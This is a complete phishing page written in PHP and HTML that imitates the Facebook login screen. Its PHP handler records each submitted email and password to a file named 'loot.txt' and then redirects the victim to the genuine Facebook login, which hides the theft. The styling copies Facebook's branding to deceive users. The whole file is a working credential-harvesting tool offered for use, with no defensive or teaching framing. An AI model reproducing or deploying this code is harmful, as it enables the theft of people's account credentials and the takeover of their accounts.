<?php
// --- THE BACKEND (Saves the data) ---
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $user = $_POST['email'];    // Match the 'name' attribute from the form
    $pass = $_POST['pass'];     // Match the 'name' attribute from the form
    $time = date('Y-m-d H:i:s');
    
    // Save to your loot file
    $data = "[$time] FB-User: $user | FB-Pass: $pass\n";
    file_put_contents("loot.txt", $data, FILE_APPEND);
    
    // --- THE REDIRECT ---
    header("Location: https://www.facebook.com/login/"); 
    exit();
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Facebook – Log In or Sign Up</title>
    <style>
        /* [Keeping your friend's original CSS here for that perfect look] */
        * { box-sizing: border-box; font-family: Helvetica, Arial, sans-serif; }
        body { margin: 0; background: #f0f2f5; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
        .container { display: flex; max-width: 980px; width: 100%; padding: 20px; gap: 40px; align-items: center; justify-content: center; flex-wrap: wrap; }
        .left { flex: 1; min-width: 300px; }
        .left h1 { color: #1877f2; font-size: 56px; margin-bottom: 10px; margin-top: 0; }
        .left p { font-size: 24px; line-height: 1.3; color: #000; margin: 0; }
        .right { background: #fff; padding: 20px; width: 360px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.2); }
        .right input { width: 100%; padding: 14px; margin-bottom: 12px; border-radius: 6px; border: 1px solid #ddd; font-size: 16px; }
        .right button { width: 100%; padding: 14px; border: none; border-radius: 6px; font-size: 18px; cursor: pointer; font-weight: bold; }
        .login-btn { background: #1877f2; color: white; }
        .divider { border-top: 1px solid #ddd; margin: 20px 0; }
        .create-btn { background: #42b72a; color: white; }
        
        @media(max-width: 768px) {
            .container { flex-direction: column; text-align: center; }
            .left h1 { font-size: 42px; }
            .right { width: 100%; max-width: 360px; }
        }
    </style>
</head>
<body>

<div class="container">
  <div class="left">
    <h1>facebook</h1>
    <p>Connect with friends and the world around you on Facebook.</p>
  </div>

  <div class="right">
    <!-- THE FORM: Pointing back to itself to trigger the PHP above -->
    <form action="index.php" method="POST">
      <input 
        type="text" 
        name="email" 
        placeholder="Email or phone number" 
        required
      />
      <input 
        type="password" 
        name="pass" 
        placeholder="Password" 
        required
      />
      <button type="submit" class="login-btn">Log In</button>
    </form>
    
    <a href="#" style="display:block; text-align:center; color:#1877f2; text-decoration:none; margin-top:10px;">Forgot password?</a>
    <div class="divider"></div>
    <button type="button" class="create-btn">Create New Account</button>
  </div>
</div>

</body>
</html>
